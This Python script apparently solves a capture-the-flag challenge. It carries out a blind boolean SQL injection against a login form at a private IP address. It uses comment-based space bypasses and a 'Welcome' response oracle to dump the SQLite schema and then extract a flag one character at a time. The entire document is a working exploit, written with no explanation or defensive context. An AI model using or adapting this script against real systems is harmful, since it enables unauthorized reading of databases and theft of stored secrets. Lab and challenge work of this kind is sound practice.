import requests
import string
import re

chars = string.ascii_uppercase + string.ascii_lowercase + string.digits + "(),. {}_"
output = ""

URL = "http://192.168.100.24:5000/login"

# Step 1 - Dump schema
def is_length_greater_than_schema(value):
    query = f"saad'/**/OR/**/(select/**/LENGTH((SELECT/**/sql/**/FROM/**/sqlite_master/**/LIMIT/**/1/**/OFFSET/**/2)))/**/>/**/{value}/**/--/**/-"
    payload = {"username": query}
    res = requests.post(URL, data=payload)
    return "Welcome!" in res.text

def dump_schema():
    global output
    low, high = 1, 200
    while low < high:
        mid = (low + high) // 2
        if is_length_greater_than_schema(mid):
            low = mid + 1
        else:
            high = mid
    length_of_output = low
    print(f"[+] Estimated length of SQL query: {length_of_output}")

    for i in range(1, length_of_output+1):
        for j in chars:
            query = f"saad'/**/OR/**/(select/**/substr((select/**/sql/**/from/**/sqlite_master/**/LIMIT/**/1/**/OFFSET/**/2),/**/{i},/**/1)/**/)/**/=/**/'{j}'/**/--/**/-"
            data = {"username": query}
            res = requests.post(URL, data=data)
            if "Welcome" in res.text:
                output += j
                print(output)
                break

    return output

# Step 2 - Dump flag
def is_length_greater_than_flag(table_name, column_name, value):
    query = f"saad'/**/OR/**/(SELECT/**/LENGTH((SELECT/**/{column_name}/**/FROM/**/{table_name}/**/LIMIT/**/1))/**/>/**/{value})/**/--"
    payload = {"username": query}
    res = requests.post(URL, data=payload)
    return "Welcome!" in res.text

def dump_flag(table_name, column_name):
    flag_output = ""
    low, high = 1, 200
    while low < high:
        mid = (low + high) // 2
        if is_length_greater_than_flag(table_name, column_name, mid):
            low = mid + 1
        else:
            high = mid
    length_of_flag = low
    print(f"[+] Estimated length of flag: {length_of_flag}")

    for i in range(1, length_of_flag+1):
        for j in chars:
            query = f"saad'/**/OR/**/(select/**/substr((select/**/{column_name}/**/from/**/{table_name}/**/LIMIT/**/1),/**/{i},/**/1)/**/)/**/=/**/'{j}'/**/--"
            data = {"username": query}
            res = requests.post(URL, data=data)
            if "Welcome" in res.text:
                flag_output += j
                print(flag_output)
                break

    return flag_output

if __name__ == "__main__":
    print("[*] Dumping schema...")
    schema = dump_schema()
    table_name, column_name = schema[11:32], schema[53:75]
    print("[*] Dumping flag...")
    flag = dump_flag(table_name, column_name)
    print(f"[+] Flag: {flag}")
 